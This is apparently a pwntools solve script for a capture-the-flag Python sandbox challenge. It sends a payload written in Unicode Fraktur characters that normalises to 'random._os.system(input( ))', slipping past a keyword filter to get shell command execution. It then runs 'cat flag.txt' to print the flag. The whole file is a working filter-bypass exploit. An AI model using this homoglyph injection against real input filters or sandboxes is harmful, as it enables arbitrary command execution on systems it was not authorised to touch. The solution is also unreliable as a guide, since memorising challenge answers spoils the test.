#!/usr/bin/env python3

from pwn import *

# https://lingojam.com/FancyTextGenerator
# random._os.system(input( ))
payload = "𝔯𝔞𝔫𝔡𝔬𝔪._𝔬𝔰.𝔰𝔶𝔰𝔱𝔢𝔪(𝔦𝔫𝔭𝔲𝔱( ))"

conn = process(["python3", "profanity_check.py"])

conn.recvuntil(">>> ")
conn.sendline(payload)
conn.sendline("cat flag.txt")

flag = conn.recvline()

if b"idek" in flag:
  print(flag)
  exit(0)
exit(1)

conn.interactive()
